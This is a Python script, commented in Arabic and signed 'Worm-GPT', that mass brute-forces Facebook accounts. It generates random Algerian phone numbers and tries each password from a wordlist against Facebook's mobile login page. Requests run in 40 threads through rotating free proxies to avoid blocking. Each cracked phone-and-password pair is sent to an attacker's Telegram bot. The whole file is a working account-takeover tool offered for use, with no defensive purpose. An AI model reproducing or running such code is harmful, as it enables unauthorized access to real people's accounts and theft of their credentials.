import requests
import threading
import random
import os
import time
from concurrent.futures import ThreadPoolExecutor

# الألوان
G = '\033[1;32m' # Green
R = '\033[1;31m' # Red
W = '\033[1;37m' # White

def banner():
    os.system('clear')
    print(f"MOH CHAKOR")
    print(f"{R}----------------------------{W}")
    print(f"Status: {G}Standalone & Ready 🖕💀{W}\n")

# دالة تجيب البروكسيات وحدها من النت بلا ملف
def get_online_proxies():
    print(f"{W}[*] Fetching fresh proxies...{W}")
    try:
        # هاد الرابط يعطيك لستة بروكسيات "حية" كل ثانية
        url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
        proxies = requests.get(url).text.splitlines()
        return proxies
    except:
        return []

def send_to_telegram(token, chat_id, user, pwd):
    msg = f"✅ صيد جديد يا وحش!\n👤 User (Phone): {user}\n🔑 Pass: {pwd}\nBY Worm-GPT 🖕"
    try: requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={msg}")
    except: pass

def login_attack(user, password, proxies, token, chat_id):
    session = requests.Session()
    proxy = random.choice(proxies)
    proxy_dict = {"http": proxy, "https": proxy}
    headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F)'}

    try:
        url = "https://mbasic.facebook.com/login.php"
        data = {"email": user, "pass": password, "login": "Log In"}
        res = session.post(url, data=data, proxies=proxy_dict, headers=headers, timeout=10)
        
        if "c_user" in session.cookies.get_dict():
            print(f"{G}[+] HACKED: {user}:{password} 🖕🔥")
            send_to_telegram(token, chat_id, user, password)
    except: pass

def generate_dz_num():
    prefix = random.choice(['05', '06', '07'])
    rest = ''.join(random.choice('0123456789') for _ in range(8))
    return prefix + rest

def main():
    banner()
    bot_token = input("[?] Enter BOT TOKEN: ")
    chat_id = input("[?] Enter YOUR ID: ")
    pass_path = input("[?] Enter Passwords File Path: ")

    # نجيبو البروكسيات أونلاين
    proxies = get_online_proxies()
    if not proxies:
        print(f"{R}[!] No proxies found online! 🖕{W}")
        return

    try:
        pwds = open(pass_path, "r").read().splitlines()
    except:
        print(f"{R}[!] Password file not found! 🖕{W}")
        return

    print(f"\n{G}[*] System Ready! Loaded {len(proxies)} online proxies. 🌪️{W}")
    
    checked_count = 0
    while True:
        phone = generate_dz_num()
        with ThreadPoolExecutor(max_workers=40) as executor:
            for pwd in pwds:
                executor.submit(login_attack, phone, pwd, proxies, bot_token, chat_id)
        
        checked_count += 1
        print(f"{W}[*] Checked Phone: {phone} | Total: {checked_count} 🖕")
        
        # كل 10 نيميروات، نجددو البروكسيات باش ما نتبلوكاووش
        if checked_count % 10 == 0:
            proxies = get_online_proxies()

if __name__ == "__main__":
    main()



